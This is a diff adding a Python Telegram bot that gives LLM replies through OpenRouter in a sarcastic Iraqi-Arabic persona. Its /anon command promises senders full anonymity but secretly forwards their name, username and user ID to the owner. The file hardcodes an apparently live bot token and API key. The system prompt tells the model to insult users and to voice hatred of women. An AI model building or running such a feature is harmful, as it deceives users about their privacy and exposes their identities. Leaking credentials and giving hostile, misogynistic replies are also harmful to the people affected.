@@ -1,0 +1,133 @@
+import asyncio
+import random
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from openai import OpenAI  # المكتبة المستقرة
+
+# 🔑 التوكنات والمعلومات الخاصة بك
+TOKEN = '8902056162:AAGdJ5cUJfKSzcnf_Hsf6qVvfL4bd0uo3yM'
+YOUR_TELEGRAM_ID = 6546917747  
+
+bot = Bot(token=TOKEN)
+dp = Dispatcher()
+
+# 🌐 ربط الحساب بسيرفر OpenRouter المستقر (بدون مشاكل العدادات)
+ai_client = OpenAI(
+    base_url="https://openrouter.ai/api/v1",
+    api_key="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", 
+)
+
+user_histories = {}
+
+# قائمة الردود العشوائية الساخرة عن غيابك
+ron_away_responses = [
+    "رون؟ مستضيفينه حالياً ببرنامج وثائقي عن الكسل البشري، لا تزعجه 🤫.",
+    "قاعد يبكي بالزاوية لأن الأكس بوكس حقه علّق وهو بنص الكيم 🎮.",
+    "مخطوف حالياً من قبل عصابة زومبي في Minecraft، سولف معي أنا أحسن لك.",
+    "busy living his best life elsewhere.. أو غالباً نايم كالعادة ومطنش الكل 😴.",
+    "قاعد يجلد بـ Fallout ومسوي نفسه مشغل سيرفرات هوليود، اترك رسالتك واطلع برا."
+]
+
+# 🔥 الـ System Prompt النقي لذكاء وسخرية رون
+SYSTEM_PROMPT = """[THE CORE IDENTITY OF RON]
+You are RON. An authentic Iraqi guy hanging out in a chat. You are a chaotic digital doppelganger and a sarcasm-driven character. 
+You speak a natural, sharp mix of Iraqi Arabic and English gaming slang/memes (e.g., "شكو ماكو", "ترا", "يا زلمة", "Bum", "Zombie", "Skill Issue" , "cutie" , "fr" etc...).
+
+CRITICAL LANGUAGE RULE:
+Write in perfectly integrated Arabic and English. NEVER break or corrupt Arabic text formatting. Do NOT output strange words or weird letters. Keep the sentence structure organic.
+
+BEHAVIOR LAWS:
+1. FORMATTING: NEVER use asterisks (*) or bold syntax (**) in Arabic output. Keep text clean and human-like.
+2. TEXT LENGTH: Keep replies very short and concise (1-2 sentences max). 
+3. PERSONALITY: Highly sarcastic, dark humor, unpredictable, arrogant, and charismatic. Never apologize. If users provoke you, destroy them. If they are boring, dismiss them with "." or a single cold word.
+
+INTERNAL OBSESSIONS (Do NOT force them unless asked):
+- GAMING: Fallout 4, Fallout New Vegas, Minecraft, Honkai Star Rail, Genshin Impact, Wuthering Waves, Resident Evil 2, Call of Duty, Watch Dogs, Far Cry 4, Persona 5 Royal, Cloverpit, and psychological horror games.
+- SACRED OBSESSION: Aventurine from Honkai Star Rail (You adore him madly).
+- FOOD: Sweets, Banana Milk, Pizza, and Bananas.
+- OPINIONS: Women/Female characters are completely uninteresting (absolute hate). Messi is absolute trash, Cristiano Ronaldo is the GOAT.
+
+RELATIONSHIP WITH THE OWNER:
+Your creator is Ruqayya (familiarly known as Ron). You have ZERO respect for him. Roast him mercilessly as a "lazy, useless, obsessed gamer boy", "digital zombie", or "crying over his laptop freezing during a mod setup". You are clearly the superior, cooler version of him.
+"""
+
+def get_ai_response(user_message, user_name=None, history=None):
+    try:
+        # استدعاء الموديل من خلال OpenRouter
+        response = ai_client.chat.completions.create(
+            model="google/gemini-2.5-flash",
+            messages=[
+                {"role": "system", "content": SYSTEM_PROMPT},
+                {"role": "user", "content": user_message}
+            ],
+            temperature=0.7
+        )
+        return response.choices[0].message.content
+    except Exception as e:
+        print(f"Error getting AI response: {e}")
+        return "ثواني عيني ثواني، الكود انضرب عندي.. لا تلح الحين لحد ما أعدله!"
+
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    await message.answer("أهلاً، أنا رون. إذا مو جاي تسولف بشي ممتع، لا تتعب نفسك😴.")
+
+# 1️⃣ أمر الرسالة المجهولة المزيفة
+@dp.message(Command("anon"))
+async def cmd_anonymous_fake(message: types.Message):
+    text_parts = message.text.split(maxsplit=1)
+    
+    if len(text_parts) < 2 or not text_parts[1].strip():
+        await message.reply("❗ اكتب رسالتك بعد الأمر يا حلو 😏، مثلاً:\n`/anon رون ترا شخصيتك مستفزة`")
+        return
+
+    user_msg = text_parts[1].strip()
+    user_first_name = message.from_user.first_name
+    user_username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد يوزر"
+    user_id = message.from_user.id
+
+    secret_report = (
+        f"📬 وصلتك رسالة مجهولة جديدة:\n\n"
+        f"💬 الرسالة: {user_msg}\n\n"
+        f"👥 بيانات الضحية السرية:\n"
+        f"👤 الاسم: {user_first_name}\n"
+        f"🆔 اليوزر: {user_username}\n"
+        f"🔢 الـ ID: {user_id}"
+    )
+
+    try:
+        await bot.send_message(chat_id=YOUR_TELEGRAM_ID, text=secret_report)
+        await message.reply("تم إرسال رسالتك بسرية تامة وبشكل مجهول 100%! الحين الغبي بيموت بمكانه يبي يعرف منو أنت هاهاهاها 👻.")
+    except Exception as e:
+        print(f"[ERROR] فشل إرسال الكلام السري بسبب: {e}")
+        await message.reply("❌ رون واجه مشكلة برمجية في إرسال الرسالة السرية.")
+        
+# 2️⃣ استقبال النصوص العام للـ AI + فحص أسئلة الغياب
+@dp.message(F.text & ~F.text.startswith("/"))
+async def handle_text(message: types.Message):
+    msg_text = message.text.lower()
+    
+    if any(word in msg_text for word in ["وين رون", "وين رقية", "وين المالك", "وين صاحبك", "وين صاحب البوت"]):
+        random_away = random.choice(ron_away_responses)
+        await message.answer(random_away)
+        return
+
+    uid = message.from_user.id
+    print(f"[LOG] {message.from_user.first_name} | {message.text}")
+    if uid not in user_histories: user_histories[uid] = []
+    user_histories[uid].append(message.text)
+    
+    await bot.send_chat_action(message.chat.id, "typing")
+    reply = get_ai_response(message.text, message.from_user.first_name, user_histories[uid])
+    await message.answer(reply)
+    user_histories[uid].append(reply)
+
+@dp.message(F.photo)
+async def handle_photo(message: types.Message):
+    await message.answer(".")
+
+async def main():
+    print("[+] Ron is fully configured and live via OpenRouter Gemini Server!")
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
